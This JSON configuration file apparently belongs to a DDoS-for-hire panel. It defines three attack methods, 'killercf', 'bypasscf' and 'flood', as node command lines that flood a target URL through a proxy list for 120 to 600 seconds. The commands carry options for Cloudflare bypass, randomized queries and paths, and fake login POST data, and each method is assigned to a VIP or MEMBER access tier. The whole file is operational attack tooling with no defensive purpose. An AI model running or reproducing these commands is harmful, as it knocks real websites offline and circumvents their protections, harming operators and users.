{
    "killercf": {
        "command": "node --max-old-space-size=65536 killercf GET \"url?q=%RAND%\" 600 5 5 live.txt --query 1 --cookie \"uh=good\" --delay 1 --cookie true --referer rand --postdata \"user=f&pass=%RAND%\" --debug --cdn true --limit true --bfm true --http mix --randpath 2 --header \"user-agent:Mozilla/5.0,referer:url\" --randrate --full",
        "url": "url",
        "time": 600,
        "visibility": "VIP"
    },
    
    "bypasscf": {
        "command": "node --max-old-space-size=65536 bypasscf url 120 5 5 live.txt --redirect true --ratelimit true --query true",
        "url": "url",
        "time": 120,
        "visibility": "MEMBER"
    },
    "flood": {
        "command": "node --max-old-space-size=65536 flood url 200 5 5 live.txt flood",
        "url": "url",
        "time": 120,
        "visibility": "MEMBER"
    }
}